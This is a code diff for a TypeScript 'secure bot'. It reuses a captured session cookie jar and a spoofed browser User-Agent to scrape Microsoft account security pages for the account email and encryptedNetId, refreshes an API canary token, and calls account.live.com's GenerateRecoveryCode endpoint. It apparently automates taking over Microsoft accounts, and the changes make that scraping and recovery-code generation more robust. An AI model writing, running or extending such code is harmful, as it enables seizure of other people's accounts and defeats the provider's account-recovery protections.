@@ -660,33 +660,173 @@ function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
   });
 }
 
-async function securityInformation(jar: CookieJar): Promise<string> {
-  const res = await fetchWithJar(jar, "https://account.live.com/proofs/Manage/additional");
-  const text = await res.text();
-  const m = text.match(/var\s+t0\s*=\s*(\{.*?\});/s);
-  if (!m) throw new Error("Failed to extract security information");
-  return m[1];
+function tryParseJsonBlob(raw: string): Record<string, unknown> | null {
+  try {
+    return JSON.parse(raw) as Record<string, unknown>;
+  } catch {
+    // MS sometimes leaves trailing junk after the object
+    try {
+      const end = raw.lastIndexOf("}");
+      if (end > 0) return JSON.parse(raw.slice(0, end + 1)) as Record<string, unknown>;
+    } catch {
+      /* ignore */
+    }
+  }
+  return null;
+}
+
+function extractJsonAssignment(html: string, names: string[]): Record<string, unknown> | null {
+  for (const name of names) {
+    // var t0 = {...};  OR  window.t0={...};  OR  t0 = {...};
+    const re = new RegExp(
+      `(?:var\\s+|window\\.|)${name}\\s*=\\s*(\\{[\\s\\S]*?\\})\\s*;`,
+      "i",
+    );
+    const m = html.match(re);
+    if (m?.[1]) {
+      const parsed = tryParseJsonBlob(m[1]);
+      if (parsed) return parsed;
+    }
+  }
+  return null;
+}
+
+function pickSecInfoFields(obj: Record<string, unknown>): {
+  email?: string;
+  encryptedNetId?: string;
+  raw: Record<string, unknown>;
+} {
+  const email =
+    (obj.email as string) ||
+    (obj.UserEmail as string) ||
+    ((obj.WLXAccount as Record<string, unknown>)?.email as string) ||
+    ((obj.oPostParams as Record<string, unknown>)?.email as string) ||
+    undefined;
+
+  const manageProofs =
+    ((obj.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>) ||
+    (obj.manageProofs as Record<string, string>) ||
+    undefined;
+
+  const encryptedNetId =
+    manageProofs?.encryptedNetId ||
+    (obj.encryptedNetId as string) ||
+    (obj.netId as string) ||
+    undefined;
+
+  return { email, encryptedNetId, raw: obj };
+}
+
+async function securityInformation(
+  jar: CookieJar,
+): Promise<{ email?: string; encryptedNetId?: string; raw: Record<string, unknown> }> {
+  const urls = [
+    "https://account.live.com/proofs/Manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
+    "https://account.live.com/proofs/Manage/additional",
+    "https://account.live.com/proofs/manage/additional?mkt=en-US",
+    "https://account.live.com/proofs/Manage",
+  ];
+
+  let lastHint = "";
+  for (const url of urls) {
+    const res = await fetchWithJar(
+      jar,
+      url,
+      {
+        headers: {
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+          Referer: "https://account.microsoft.com/",
+        },
+      },
+      { timeoutMs: 25_000, followRedirects: true, maxRedirects: 12 },
+    );
+    const text = await res.text();
+    const finalUrl = res.url || url;
+
+    // Login redirect / challenge pages
+    if (
+      /login\.live\.com|account\.live\.com\/Abort|interrupt/i.test(finalUrl) ||
+      /name="loginfmt"|id="i0116"|sFTTag|ppft/i.test(text)
+    ) {
+      lastHint = `login/interrupt page status=${res.status} url=${finalUrl.slice(0, 120)} len=${text.length}`;
+      continue;
+    }
+
+    const candidates = [
+      extractJsonAssignment(text, ["t0", "ServerData", "oPageConfig", "pageConfig", "serverData"]),
+    ].filter(Boolean) as Record<string, unknown>[];
+
+    // Fallback: scrape fields directly from HTML/JSON fragments
+    if (!candidates.length) {
+      const emailMatch =
+        text.match(/"email"\s*:\s*"([^"]+@[^"]+)"/) ||
+        text.match(/"UserEmail"\s*:\s*"([^"]+@[^"]+)"/);
+      const netIdMatch =
+        text.match(/"encryptedNetId"\s*:\s*"([^"]+)"/) ||
+        text.match(/encryptedNetId&quot;:&quot;([^&]+)&quot;/);
+      if (emailMatch || netIdMatch) {
+        return {
+          email: emailMatch?.[1],
+          encryptedNetId: netIdMatch?.[1] ? decodeUnicode(netIdMatch[1]) : undefined,
+          raw: {},
+        };
+      }
+      lastHint = `no blob status=${res.status} url=${finalUrl.slice(0, 120)} len=${text.length} hasT0=${/t0\s*=/.test(text)} hasServerData=${/ServerData\s*=/.test(text)}`;
+      continue;
+    }
+
+    for (const c of candidates) {
+      const fields = pickSecInfoFields(c);
+      if (fields.email || fields.encryptedNetId) return fields;
+      // deeper search in nested JSON string dump
+      const dump = JSON.stringify(c);
+      const email2 = dump.match(/"email"\s*:\s*"([^"]+@[^"]+)"/)?.[1];
+      const net2 = dump.match(/"encryptedNetId"\s*:\s*"([^"]+)"/)?.[1];
+      if (email2 || net2) {
+        return {
+          email: email2,
+          encryptedNetId: net2 ? decodeUnicode(net2) : undefined,
+          raw: c,
+        };
+      }
+    }
+    lastHint = `parsed blob but missing fields status=${res.status} keys=${Object.keys(candidates[0]).slice(0, 12).join(",")}`;
+  }
+
+  throw new Error(`Failed to extract security information (${lastHint || "no pages"})`);
 }
 
 async function getRecoveryCode(jar: CookieJar, apiCanary: string, encryptedNetId: string): Promise<string> {
-  const res = await fetchWithJar(jar, "https://account.live.com/API/Proofs/GenerateRecoveryCode", {
-    method: "POST",
-    headers: {
-      Accept: "application/json",
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "x-ms-apiVersion": "2",
-      "x-ms-apiTransport": "xhr",
-      uiflvr: "1001",
-      scid: "100109",
-      hpgid: "201030",
-      "X-Requested-With": "XMLHttpRequest",
-      Origin: "https://account.live.com",
-      Referer: "https://account.live.com/proofs/Manage/additional",
-      canary: apiCanary,
+  const res = await fetchWithJar(
+    jar,
+    "https://account.live.com/API/Proofs/GenerateRecoveryCode",
+    {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json; charset=utf-8",
+        "x-ms-apiVersion": "2",
+        "x-ms-apiTransport": "xhr",
+        uiflvr: "1001",
+        scid: "100109",
+        hpgid: "201030",
+        "X-Requested-With": "XMLHttpRequest",
+        Origin: "https://account.live.com",
+        Referer: "https://account.live.com/proofs/Manage/additional",
+        canary: apiCanary,
+      },
+      body: JSON.stringify({ encryptedNetId, uiflvr: 1001, scid: 100109, hpgid: 201030 }),
     },
-    body: JSON.stringify({ encryptedNetId, uiflvr: 1001, scid: 100109, hpgid: 201030 }),
-  });
+    { timeoutMs: 25_000 },
+  );
   const data = (await res.json()) as Record<string, string>;
+  if (!data.recoveryCode) {
+    throw new Error(
+      `GenerateRecoveryCode failed status=${res.status} body=${JSON.stringify(data).slice(0, 200)}`,
+    );
+  }
   return data.recoveryCode;
 }
 
@@ -1193,10 +1333,27 @@ export async function runSecureBot(
 
     // Recovery
     await log("info", "[secure] Getting security information...");
-    let secInfoJson: Record<string, unknown> | null = null;
+    let mainEmail: string | undefined;
+    let encryptedNetId: string | undefined;
     try {
-      const secInfoStr = await withTimeout(securityInformation(jar), 25_000, "securityInformation");
-      secInfoJson = JSON.parse(secInfoStr) as Record<string, unknown>;
+      // Refresh canary right before recovery — proofs/services may invalidate it
+      try {
+        const refreshed = await withTimeout(getCookies(jar), 20_000, "refreshApiCanary");
+        if (refreshed) apiCanary = refreshed;
+      } catch (e) {
+        await log(
+          "warn",
+          `[secure] canary refresh failed: ${e instanceof Error ? e.message : e}`,
+        );
+      }
+
+      const secInfo = await withTimeout(securityInformation(jar), 45_000, "securityInformation");
+      mainEmail = secInfo.email;
+      encryptedNetId = secInfo.encryptedNetId;
+      await log(
+        "info",
+        `[secure] Sec info ok email=${mainEmail || "?"} netId=${encryptedNetId ? "yes" : "no"}`,
+      );
     } catch (e) {
       await log(
         "error",
@@ -1204,12 +1361,8 @@ export async function runSecureBot(
       );
     }
 
-    if (secInfoJson) {
+    if (mainEmail || encryptedNetId) {
       ensureAlive();
-      const mainEmail = secInfoJson.email as string;
-      const encryptedNetId = (
-        (secInfoJson.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>
-      )?.encryptedNetId;
 
       if (mainEmail && encryptedNetId && apiCanary) {
         try {
@@ -1289,7 +1442,7 @@ export async function runSecureBot(
       } else {
         await log(
           "error",
-          `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${!!mainEmail} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
+          `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${mainEmail || "no"} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
         );
       }
     }
